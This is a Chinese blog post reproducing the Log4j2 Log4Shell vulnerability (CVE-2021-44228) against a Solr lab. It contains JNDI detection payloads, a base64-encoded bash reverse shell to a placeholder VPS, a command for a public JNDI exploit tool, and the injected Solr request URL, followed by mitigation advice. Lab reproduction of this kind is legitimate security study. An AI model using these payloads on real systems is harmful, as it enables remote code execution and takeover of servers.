---
layout:     post
title:      Apache Log4j2 远程代码执行漏洞（CVE-2021-44228）
subtitle:   纸上得来终觉浅，绝知此事要躬行
date:       2023-7-20
author:     xuoneyuan
header-img: 
catalog: 	  true
tags:
    - 漏洞复现
---
### 前言
做这个漏洞复现的主要原因是因为在看微信公众号文章的时候看到了这么一张图，第一眼看的时候就没绷住，后来在空间看到一个福建来的信安天才少年发了说说就是这张图，感觉有点意思，就想着自己也来复现一下

![每次看都绷不住]({{site.baseurl}}/img-post/l-13.png)

这里我翻译一下：
- ldap://：这表示URL使用LDAP协议进行通信
- chinaran404：这是LDAP服务器的主机名或IP地址
- /loveme：这是LDAP服务器内特定资源的路径，可能是一个目录、条目或其他对象

这不禁让我想起了这张图（知乎看到的，侵删）

![真的是一个悲伤的故事]({{site.baseurl}}/img-post/l-15.png)

好了言归正传，我们来分析一下这个漏洞

### 漏洞分析
#### log4j2是什么
log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息
#### JNDI是什么
JNDI，全称为Java命名和目录接口（Java Naming and Directory Interface）,是SUN公司提供的一种标准的Java命名系统接口，允许从指定的远程服务器获取并加载对象。JNDI相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务
#### log4j2远程代码执行漏洞原理
log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）\
攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）

示意图:
![1]({{site.baseurl}}/img-post/l-17.png)
#### 漏洞等级
高危\
官方 CVSS 评分 10.0
#### 影响版本
Apache Log4j2 2.x <= 2.14.1\
Apache Log4j2 2.15.0-rc1（补丁绕过）
### 漏洞复现
#### 环境搭建
这里我使用的是vulhub，利用docker启动关闭环境
没有vulhub的可以用这个靶场：https://vulfocus.cn/#/dashboard
没有docker的先下载
![1]({{site.baseurl}}/img-post/l-1.png)
vulhub的下载
~~~
wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
unzip vulhub-master.zip
cd vulhub-master
~~~
然后进入需要开启的漏洞路径
~~~
cd vulhub-master/xxx/xxx
docker-compose up -d
~~~
![1]({{site.baseurl}}/img-post/l-2.png)
端口是8983，我们接下来访问http://192.168.xxx.xxx:8983/solr/#/
![1]({{site.baseurl}}/img-post/l-3.png)
#### 漏洞检测
官方POC(二选一）
~~~
${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}
${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}
~~~
利用DnsLog平台检测dns回显，查看是否有漏洞存在，获取一个子域名
![1]({{site.baseurl}}/img-post/l-4.png)
接着我们就可以对目标网站进行测试了，访问：http://192.168.xxx.xxx:8983/solr/admin/cores?${jndi:ldap://${sys:java.version}.xxxxxx.dnslog.cn }
![1]({{site.baseurl}}/img-post/l-5.png)
返回，刷新后得到数据
![1]({{site.baseurl}}/img-post/l-6.png)

#### 漏洞利用
反弹shell的命令
~~~
bash -i >& /dev/tcp/vps_ip/6666 0>&1
~~~
接着进行编码，对命令进行base64加密即可
![1]({{site.baseurl}}/img-post/l-18.png)
接下来利用现成的JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，项目地址：https://github.com/welk1n/JNDI-Injection-Exploit
（注意下载的时候要关掉一切防火墙和实时保护）
最迟到这里你的kali攻击机就要启动了，执行命令
~~~
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}" -A 192.168.xxx.xxx
~~~
运行后终端如图：
![1]({{site.baseurl}}/img-post/l-7.png)
这里已经一键部署好了RMI和LDAP服务的站点，并给出了路径，我选择用ldap，JDK1.8的版本为ldap://192.168.xxx.xxx:1389/Exploit，JDK1.7的版本为：ldap://192.168.xxx.xxx:1389/Exploit 这两个版本任选一个都行
再打开一个终端开启nc
![1]({{site.baseurl}}/img-post/l-8.png)
把工具生成的payload插入到action后面
~~~
http://192.168.xxx.xxx:8983/solr/admin/cores?action=${jndi:ldap://192.168.xxx.xxx:1389/xxxxxx}
~~~
![1]({{site.baseurl}}/img-post/l-9.png)

再次返回kali我们可以看到nc成功反弹shell，但是我这里有一个小问题，就是shell没有反弹回来，查了一下csdn的一个大佬说他也反弹不回来，换了一个靶场就好了，所以可能是vulhub这个靶场的问题，我试了好几个端口比如6969，8888都没有成功反弹shell，这个时候已经凌晨2：40了，于是我决定先睡觉（~~没错我就是懒狗~~）

反弹成功的回显是这样的

![1]({{site.baseurl}}/img-post/l-11.png)

本来到这里就应该结束了，但是我还是发现一个问题，就是在JNDI注入工具上决定了你是黑客大佬还是脚本小子，如果只会用工具，那么小学生都能顺利完成这个漏洞复现（问题是我已经大学了），在JNDI脚本运行上我又出了问题

![1]({{site.baseurl}}/img-post/l-12.png)

我尝试了一下网上的方法，说是maven打包出现了问题，我照他的方法重新配置了起步依赖，但是没有用，这个事情充分说明了不会编程的hacker就是个伪命题（你给我去学Java、golang）

![1]({{site.baseurl}}/img-post/l-16.png)

#### 修复建议
1. 设置log4j2.formatMsgNoLookups=True，相当于直接禁止lookup查询出栈，也就不可能请求到访问到远程的恶意站点
2. 对包含有"jndi:ldap://"、"jndi:rmi//"这样字符串的请求进行拦截，即拦截JNDI语句来防止JNDI注入
3. 对系统进行合理配置，禁止不必要的业务访问外网，配置网络防火墙,禁止系统主动外连网络等等
4. 升级log4j2组件到新的安全的版本

### 彩蛋
![1]({{site.baseurl}}/img-post/l-14.png)
